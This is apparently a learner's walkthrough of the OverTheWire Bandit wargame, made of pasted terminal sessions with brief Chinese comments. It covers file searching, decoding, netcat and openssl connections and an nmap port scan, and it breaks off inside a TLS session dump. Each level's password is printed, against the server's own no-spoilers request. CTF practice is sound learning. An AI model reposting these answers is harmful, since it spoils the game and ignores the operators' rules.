drwxr-xr-x 3 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc drwxr-xr-x 2 root root 4096 Apr 23 18:04 inhere/ -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit3@bandit:~$ ls inhere/ bandit3@bandit:~$ ll inhere/ total 12 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 bandit4 bandit3 33 Apr 23 18:04 .hidden bandit3@bandit:~$ cat ./inhere/.hidden 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe bandit3@bandit:~$ level5 bandit4@bandit:~$ ls inhere bandit4@bandit:~$ cd inhere/ bandit4@bandit:~/inhere$ ll total 48 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file00 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file01 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file02 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file03 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file04 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file05 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file06 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file07 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file08 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file09 bandit4@bandit:~/inhere$ cat ./-file06 '\ufffdwk^j\ufffd\ufffdM\ufffd;,\ufffdco9bandit4@bandit:~/inhere$ # \u4f7f\u7528reset\u540e bandit4@bandit:~/inhere$ cat ./-file07 lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR bandit4@bandit:~/inhere$ \u8fd9\u91cc \u6709\u4e00\u4e2a\u8bb2\u4e86reset\u548cclear\u7684\u533a\u522b\uff0c\u5f88\u7b80\u5355 level6 \u633a\u9ebb\u70e6\u7684\u4e00\u4e2a\u9e21\u513f\u9898 bandit5@bandit:~/inhere$ cd maybehere07 bandit5@bandit:~/inhere/maybehere07$ ll total 56 drwxr-x--- 2 root bandit5 4096 Apr 23 18:04 ./ drwxr-x--- 22 root bandit5 4096 Apr 23 18:04 ../ -rwxr-x--- 1 root bandit5 3663 Apr 23 18:04 -file1* -rwxr-x--- 1 root bandit5 3065 Apr 23 18:04 .file1* -rw-r----- 1 root bandit5 2488 Apr 23 18:04 -file2 -rw-r----- 1 root bandit5 1033 Apr 23 18:04 .file2 -rwxr-x--- 1 root bandit5 3362 Apr 23 18:04 -file3* -rwxr-x--- 1 root bandit5 1997 Apr 23 18:04 .file3* -rwxr-x--- 1 root bandit5 4130 Apr 23 18:04 spaces file1* -rw-r----- 1 root bandit5 9064 Apr 23 18:04 spaces file2 -rwxr-x--- 1 root bandit5 1022 Apr 23 18:04 spaces file3* bandit5@bandit:~/inhere/maybehere07$ cat .file2 P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU \u8fd9\u91cc\u9700\u8981\u77e5\u9053ll\u8f93\u51fa\u7684\u8fd9\u4e00\u5927\u5806\u90fd\u662f\u5565\u73a9\u610f\u513f\uff0crwx\u5206\u522b\u4ee3\u8868\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\uff0c\u5269\u4e0b\u7684\u770b\u6587\u6863\u5427\u3002 level7 \u8981\u4f7f\u7528find\u4e86 # \u6211cd\u5230\u6839\u76ee\u5f55\u4e5f\u6ca1\u600e\u4e48\u53d1\u73b0\uff0c\u56e0\u6b64\u76f4\u63a5find\u641c\u7d22\u4e86\uff0c\u8fd8\u633a\u5feb\u7684\uff0c\u6309\u7406\u8bf4linux\u81ea\u5e26\u8fd9\u4e9b\u7834\u73a9\u610f\u513f\u4e0d\u8be5\u8fd9\u4e48\u5feb\u7684\u3002\u3002\u3002 bandit6@bandit:/$ find / -type f -size 33c -user bandit7 -group bandit6 2>/dev/null /var/lib/dpkg/info/bandit7.password bandit6@bandit:/$ cat /var/lib/dpkg/info/bandit7.password z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S \u90a3\u4e2a\u659c\u6760\u662f\u6307\u5b9a\u4e3a\u6839\u76ee\u5f55\uff0c\u7136\u540e\u5c31\u662f\u5927\u5c0f\u3001\u7528\u6237\u3001\u7ec4\uff0c\u6700\u540e\u6709\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u5230\u9ed1\u6d1e\uff0c\u4e0d\u5199\u4e5f\u6ca1\u4e8b\u513f\uff0c\u6211\u4e60\u60ef\u4e86 level8 \u8fd9\u4e2a\u5c31\u662fgrep bandit7@bandit:~$ find / -type f -name \"data.txt\" -exec grep -l \"million\" {} \\; 2>/dev/null /home/bandit7/data.txt bandit7@bandit:~$ grep \"millionth\" data.txt millionth TESKZC0XvTetK0S9xNwm25STk5iWrBvP \u5176\u5b9e\u53e6\u4e00\u4e2a\u529e\u6cd5\u662f\u6253\u5f00\u6587\u4ef6\u7136\u540e\u7528vim\u7684\u641c\u7d22\uff0c\u6211\u8bd5\u4e86\u8bd5\u4e5f\u633a\u5feb\u7684 level9 \u7528\u4e00\u4e0bsort\u5373\u53ef bandit8@bandit:~$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r----- 1 bandit9 bandit8 33033 Apr 23 18:04 data.txt -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit8@bandit:~$ sort data.txt | uniq -c | sort -n | head -n1 1 EN632PlfYiZbn3PhVK3XOGSlNInNE00t bandit8@bandit:~$ level10 \u597d\u50cf\u662f\u6b63\u5219\uff0c\u6211\u4e0d\u592a\u4f1a\uff0c\u8349\u8349\u5199\u4e86\u4e9b bandit9@bandit:~$ strings data.txt | grep -oE \"==.*\" ========== the# ========== password ========== is ========== G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s bandit9@bandit:~$ level11 base64\u89e3\u7801 bandit10@bandit:~$ cat data.txt | base64 -d The password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM bandit10@bandit:~$ level12 \u4f7f\u7528tr \u4e07\u5e78\u67e5\u4e86\u4e00\u4e0b\uff0c\u5dee\u70b9\u513f\u5199\u4e2a\u811a\u672c\u3002\u3002\u3002 bandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv level13 \u6709\u70b9\u513f\u590d\u6742\u554a\uff0c\u95ee\u7684chatgpt\u7136\u540e\u624d\u4f1a\u7684 # \u5148mkdir\u7136\u540ecp bandit12@bandit:~$ cd /tmp/myname123 bandit12@bandit:/tmp/myname123$ xxd -r /tmp/myname123/data.txt > /tmp/myname123/data.bin bandit12@bandit:/tmp/myname123$ file /tmp/myname123/data.bin /tmp/myname123/data.bin: gzip compressed data, was \"data2.bin\", last modified: Sun Apr 23 18:04:23 2023, max compression, from Unix, original size modulo 2^32 581 bandit12@bandit:/tmp/myname123$ gzip -d -S .bin /tmp/myname123/data.bin bandit12@bandit:/tmp/myname123$ ll total 10628 drwxrwxr-x 2 bandit12 bandit12 4096 Jul 17 03:01 ./ drwxrwx-wt 3791 root root 10801152 Jul 17 03:03 ../ -rw-rw-r-- 1 bandit12 bandit12 0 Jul 17 02:39 bandit -rw-rw-r-- 1 bandit12 bandit12 581 Jul 17 02:59 data -rw-rw-r-- 1 bandit12 bandit12 20480 Jul 16 19:05 data5.tar -rw-r--r-- 1 bandit12 bandit12 10240 Apr 23 18:04 data6.tar -rw-r--r-- 1 bandit12 bandit12 10240 Apr 23 18:04 data8.tar -rw-r--r-- 1 bandit12 bandit12 49 Apr 23 18:04 data9 -rw-rw-r-- 1 bandit12 bandit12 581 Jul 16 15:25 data.bz2 -rw-r----- 1 bandit12 bandit12 2642 Jul 16 19:00 data.hex -rw-r----- 1 bandit12 bandit12 2642 Jul 17 02:50 data.txt -rw-r----- 1 bandit12 bandit12 2642 Jul 17 02:34 mydata.txt bandit12@bandit:/tmp/myname123$ cat data9 The password is wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw bandit12@bandit:/tmp/myname123$ level14 \u6c34\uff0c\u7528\u79c1\u94a5\u767b\u5f55 bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost -p 2220 The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit13/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames !!! You are trying to log into this SSH server with a password on port 2220 from localhost. !!! Connecting from localhost is blocked to conserve resources. !!! Please log out and log in again. ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! bandit14@bandit:~$ level15 nc\u8fd9\u4e2a\u547d\u4ee4\u5728\u590d\u6742\u60c5\u51b5\u4e0b\u9700\u8981\u81ea\u5df1\u5199http\u8bf7\u6c42\u7684\u5185\u5bb9\uff0c\u633a\u79bb\u8c31\u7684\uff0c\u8fd8\u662fcurl\u548cpython\u65b9\u4fbf \u4e00\u4e9b\u5b66\u4e60\u7684\u94fe\u63a5 https://juejin.cn/post/6995203632387866631 \u3001 https://www.runoob.com/linux/linux-comm-nc.html \uff0c\u66f4\u591a\u5185\u5bb9\u53ef\u4ee5\u53c2\u8003CSE365 sp23\u7684 talking web \u6a21\u5757\u3002 bandit14@bandit:/etc/bandit_pass$ cat bandit14 fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq bandit14@bandit:/etc/bandit_pass$ cat bandit14 | nc localhost 30000 Correct! jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt bandit14@bandit:/etc/bandit_pass$ level16 bandit14@bandit:echo \"jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt\" | openssl s_client -connect localhost:30001 -ign_eof Correct! JQttfApK4SeyHwDlI9SXGR50qclOAil1 closed level17 bandit16@bandit:~$ nmap -sV localhost -T5 -p 31000-32000 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-17 04:20 UTC Nmap scan report for localhost (127.0.0.1) Host is up (0.00015s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 31046/tcp open echo 31518/tcp open ssl/echo 31691/tcp open echo 31790/tcp open ssl/unknown 31960/tcp open echo 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port31790-TCP:V=7.80%T=SSL%I=7%D=7/17%Time=64B4C185%P=x86_64-pc-linux-g SF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cu SF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the SF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20Plea SF:se\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest, SF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\ SF:n\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x SF:20password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20 SF:correct\\x20current\\x20password\\n\")%r(TerminalServerCookie,31,\"Wrong!\\x2 SF:0Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(TLSSess SF:ionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20pa SF:ssword\\n\")%r(Kerberos,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x SF:20current\\x20password\\n\")%r(FourOhFourRequest,31,\"Wrong!\\x20Please\\x20e SF:nter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(LPDString,31,\"Wrong SF:!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(LDA SF:PSearchReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x SF:20password\\n\")%r(SIPOptions,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20cor SF:rect\\x20current\\x20password\\n\"); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 98.85 seconds \u7136\u540e\uff0c\u8981\u8f93\u516516\u7684\u5bc6\u7801 bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof CONNECTED(00000003) Can't use SSL_get_servername depth=0 CN = localhost verify error:num=18:self-signed certificate verify return:1 depth=0 CN = localhost verify error:num=10:certificate has expired notAfter=Jul 17 03:32:59 2023 GMT verify return:1 depth=0 CN = localhost notAfter=Jul 17 03:32:59 2023 GMT verify return:1 --- Certificate chain 0 s:CN = localhost i:CN = localhost a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1 v:NotBefore: Jul 17 03:31:59 2023 GMT; NotAfter: Jul 17 03:32:59 2023 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIDCzCCAfOgAwIBAgIEasML0jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjMwNzE3MDMzMTU5WhcNMjMwNzE3MDMzMjU5WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ WpK5aICLya01rGDXaLVwQpZqWmn75BPH3O2vrqMAu14iXbKtemseBnOaB3vSfu04 QNfWLYWKrnab4hd73/TOurIHq33MnsH8Yb+lzx6VfBq/FouTviT2QBE5cVlvQV63 QPjJZ4mBomudPpDXLfbHWxsH8BYxa6lSqBjs8EqOnfEL9SRoQ+H0w66NjpOnGtLO l0oYAbmriOkmOht1tr1hoxiacNZa9WEOq01SNrIRGbhOPw07c7/rVXfz9dDBrhPQ D7FpX/UDyZvJFM3I+sTpwoUj7Ypzvhim+kVY9lGRnzuy439yGovgURCiNwlXUpDA /Kr/hRCriC3URJT4mWKdAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQBy qV/aRIcHHbKSksYqANDBrkLgfXKXKeXMZBTBq3Q4rMLF/ux7tGU+2/YPAo/6L0IZ 2/UGcW+/msmgvBE3+j5FnIB/aoqp2M8fksOiaC8OrsJ6bbShEEV+q5VITosF/Nw0 qrpoXa+7l5IF/8tuTCpi4ZQGHX+uoRgufcGkK3c8Gxsb9Xtroz8se7yLU0VKLm4d /H0Ozu4QkVTaQ+7971pXYHyip3tKuJbCeJOJledvqGvvcaIvE9S1vxEugQUq2K6u DZfCLU3TR9l29QonH13HtF5mEDNE4KaMtYxM4B4Mo3KMUHVf4hi4nKJVpjs/FSiI Vpv3P9pqfmYjEQjp7yIz -----END CERTIFICATE----- subject=CN = localhost issuer=CN = localhost --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 1339 bytes and written 373 bytes Verification error: certificate has expired --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Server public key is 2048 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 10 (certificate has expired) --- --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: AD5693D41623D8997CC2EE94B1CC7C61F949EFBC34B80DC8421E8B82C6572B65 Session-ID-ctx: Resumption PSK: AFE5847E9831517B3B0BCF4B511501803A902004393C9D3D926CA22524CCE716B6A771D7802C706EF3C94E8C264D4B95 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - c4 53 bd cd 78 c9 dd 28-f5 14 4c 9d 30 a0 18 97 .S..x..(..L.0... 0020 - 5d d6 5b 92 2f 96 7a 0e-ac e2 49 bc e3 d1 a6 79 ].[./.z...I....y 0030 - 73 37 ea 00 c4 4f 0a 07-4c 4e b9 f8 f4 fe 04 bd s7...O..LN...... 0040 - cb a9 f5 31 28 a1 b9 07-fd cb 83 8b 8d 93 b8 7f ...1(........... 0050 - 51 10 1a b9 7c 4e 10 ab-4b 93 8c c7 88 9f 6e 85 Q...|N..K.....n. 0060 - 87 e8 fc bc 3d f7 93 f0-2f 55 1d cf 64 80 7c 08 ....=.../U..d.|. 0070 - f2 1c 95 b9 d1 3f 15 90-57 e1 b1 9e 93 87 1d 72 .....?..W......r 0080 - 93 ed 83 b8 4b ef d2 bd-1d f5 ca 1b f9 d6 7a ff ....K.........z. 0090 - 13 fd 8f 40 43 fe 97 99-2a fa eb f9 52 ad b0 27 ...@C...*...R..' 00a0 - be 2a a0 5c a7 fd 76 6a-22 58 a4 56 02 e7 f2 13 .*.\\..vj\"X.V.... 00b0 - 4b 01 58 44 ab 63 3d 3d-fa 7e f7 ac 66 8c ef da K.XD.c==.~..f... 00c0 - 79 db d0 58 9f c1 fe 8c-3f 95 19 ed a6 f6 08 e8 y..X....?....... Start Time: 1689568148 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 731D8DE5B4509BB39289FED6CED817A731462808EFAF8C604A5BEE6E85CD12AB Session-ID-ctx: Resumption PSK: F18769CA70C1B23B9CAFAD3D8682E406B83AF8FC439A378D79ABBB19CD4B59EE837D9121AB1BA7FCCF1F761FA4AFB8F7 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - 23 10 a4 f3 c5 e4 25 65-c5 73 a7 ce d3 1b 98 bf #.....%e.s...... 0020 - 1a 41 ff b2 2e 44 0f c6-a2 7c a6 12 0c 22 7a a9 .A...D...|...\"z. 0030 - 28 d6 09 17 d2 7a 97 5b-a3 37 fc 5c de 86 24 47 (....z.[.7.\\..$G 0040 - 78 20 db 23 15 d1 3d 77-19 b2 91 dc c7 43 d6 66 x .#..=w.....C.f 0050 - 3c 04 a7 dd b9 32 e6 0f-16 a1 ab dd 92 99 18 e7 <....2.......... 0060 - 23 ad ab 79 3e af 2d ca-ea 4e 29 67 27 39 d2 d4 #..y>.-..N)g'9.. 0070 - e9 6f e0 5b be 0d d4 2d-07 e2 83 10 4a aa 94 20 .o.[...-....J.. 0080 - 1e 06 3d 42 df 74 91 99-43 cc bc ca 5c 59 74 f1 ..=B.t..C...\\Yt. 0090 - df 00 c4 16 44 2d a1 0f-db db 65 84 3b 89 58 b4 ....D-....e.;.X. 00a0 - 81 71 91 ec 5c 5e a3 db-51 25 b4 37 e5 0d 6b 41 .q..\\^..Q%.7..kA 00b0 - 88 a8 dc 9d b3 02 5b 68-04 4c 01 cd cd a3 17 24 ......[h.L.....$ 00c0 - 4a fe f5 03 49 ab 60 1e-b3 eb 07 04 92 c5 ff ab J...I.`......... Start Time: 1689568148 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK Wrong! Please enter the correct current password closed \u662f\u4ece\u8fd9\u91cc\u770b\u51fa\u6765\u8981\u8f93\u5165\u5bc6\u7801\u7684\uff01 bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof CONNECTED(00000003) Can't use SSL_get_servername depth=0 CN = localhost verify error:num=18:self-signed certificate verify return:1 depth=0 CN = localhost verify error:num=10:certificate has expired notAfter=Jul 17 03:32:59 2023 GMT verify return:1 depth=0 CN = localhost notAfter=Jul 17 03:32:59 2023 GMT verify return:1 --- Certificate chain 0 s:CN = localhost i:CN = localhost a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA1 v:NotBefore: Jul 17 03:31:59 2023 GMT; NotAfter: Jul 17 03:32:59 2023 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIDCzCCAfOgAwIBAgIEasML0jANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls b2NhbGhvc3QwHhcNMjMwNzE3MDMzMTU5WhcNMjMwNzE3MDMzMjU5WjAUMRIwEAYD VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ WpK5aICLya01rGDXaLVwQpZqWmn75BPH3O2vrqMAu14iXbKtemseBnOaB3vSfu04 QNfWLYWKrnab4hd73/TOurIHq33MnsH8Yb+lzx6VfBq/FouTviT2QBE5cVlvQV63 QPjJZ4mBomudPpDXLfbHWxsH8BYxa6lSqBjs8EqOnfEL9SRoQ+H0w66NjpOnGtLO l0oYAbmriOkmOht1tr1hoxiacNZa9WEOq01SNrIRGbhOPw07c7/rVXfz9dDBrhPQ D7FpX/UDyZvJFM3I+sTpwoUj7Ypzvhim+kVY9lGRnzuy439yGovgURCiNwlXUpDA /Kr/hRCriC3URJT4mWKdAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQBy qV/aRIcHHbKSksYqANDBrkLgfXKXKeXMZBTBq3Q4rMLF/ux7tGU+2/YPAo/6L0IZ 2/UGcW+/msmgvBE3+j5FnIB/aoqp2M8fksOiaC8OrsJ6bbShEEV+q5VITosF/Nw0 qrpoXa+7l5IF/8tuTCpi4ZQGHX+uoRgufcGkK3c8Gxsb9Xtroz8se7yLU0VKLm4d /H0Ozu4QkVTaQ+7971pXYHyip3tKuJbCeJOJledvqGvvcaIvE9S1vxEugQUq2K6u DZfCLU3TR9l29QonH13HtF5mEDNE4KaMtYxM4B4Mo3KMUHVf4hi4nKJVpjs/FSiI Vpv3P9pqfmYjEQjp7yIz -----END CERTIFICATE----- subject=CN = localhost issuer=CN = localhost --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 1339 bytes and written 373 bytes Verification error: certificate has expired --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Server public key is 2048 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 10 (certificate has expired) --- --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 1B8DD2D7E7B861C8494FB2E901FEB50552571BFE7200C45C57EEACE66795AEEA Session-ID-ctx: Resumption PSK: 25F7290250EB5F41F5C184E597BD8493DFD4EC4E8965B10CE6A409D2909B370F30DB9A1E965F680CCD6F9C9E3BC4D0C6 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - a1 6b 8c 90 89 4b 8b e8-df 1e 82 05 28 ad a8 5f .k...K......(.._ 0020 - 65 f3 03 76 14 8f d5 97-8a a5 28 ea 20 2f 06 55 e..v......(. /.U 0030 - 16 ba 4b 88 de ab 7e 00-1c 76 ba 08 b1 e7 0f a9 ..K...~..v...... 0040 - 1d 53 2a 31 16 6b 02 0d-2e dd e7 9a f4 9a e8 13 .S*1.k.......... 0050 - 13 a1 20 67 4c 24 07 53-18 c1 68 56 30 f4 92 c3 .. gL$.S..hV0... 0060 - b5 5b a6 4d 99 ff 16 fd-30 72 9b 0e f7 f2 c6 ab .[.M....0r...... 0070 - 69 c1 c0 b9 16 18 3d 5c-c4 db 4f b9 06 bf 6c 6f i.....=\\..O...lo 0080 - 51 c4 99 60 fa 03 55 af-ad 46 ed e1 53 0f 92 65 Q..`..U..F..S..e 0090 - 57 82 b9 5b ce 5b 40 37-4f d5 a8 a3 27 63 b9 2d W..[.[@7O...'c.- 00a0 - 6b e4 ea 11 f2 9f c3 f7-82 3d 16 4e 2b 40 d3 25 k........=.N+@.% 00b0 - 50 10 0f aa 74 30 49 da-c8 01 32 23 c0 b7 3c 8b P...t0I...2#..<. 00c0 - 97 8d 24 10 2d 93 73 04-33 01 d9 70 92 26 4e fc ..$.-.s.3..p.&N. Start Time: 1689568162 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: A0EF32E17C1AC0960FD46EE50181836B83644B2168CDC3087A3612EC77D9A111 Session-ID-ctx: Resumption PSK: 117786B647299C2A691BD342EDC8E39A7899490BE868D804415203AED03876A67C51CE8E55D236DAC96130391C36759A PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - f3 b6 fd 9d 6e e3 35 98-ad 1d df 9e 75 38 c5 47 ....n.5.....u8.G 0020 - 15 7a c4 8f 31 3b 39 1e-ef 1c f2 56 f2 61 48 a9 .z..1;9....V.aH. 0030 - 36 ae 3d 66 e9 0d 0f ff-07 39 33 77 d7 87 8c 63 6.=f.....93w...c 0040 - fb 00 ab 1e 27 3a 91 ed-24 49 b6 e2 9d 49 a6 2b ....':..$I...I.+ 0050 - 90 ce a6 8b ea 1c bd f5-38 77 83 fc 9b 4c b4 49 ........8w...L.I 0060 - 3b d9 7c bb 52 0b 2d 38-88 a5 80 b0 8e 80 5d 66 ;.|.R.-8......]f 0070 - 1e 0b 9d 10 b2 81 11 51-0a 30 60 ec b9 2d d2 5e .......Q.0`..-.^ 0080 - 64 66 87 44 84 78 f8 e5-2b 62 cb 5f 84 aa 50 01 df.D.x..+b._..P. 0090 - 5d d6 62 fd e8 8b f8 fc-91 0c 8a f9 a7 12 6e ae ].b...........n. 00a0 - b9 40 f2 4f 90 01 0e 30-cf bf 16 3a b5 96 fc 3a .@.O...0...:...: 00b0 - 9b a5 e0 4a 54 df eb 39-68 be 05 77 6b 50 d7 a3 ...JT..9h..wkP.. 00c0 - 87 0e 7d bf 33 1a 9e 31-40 b6 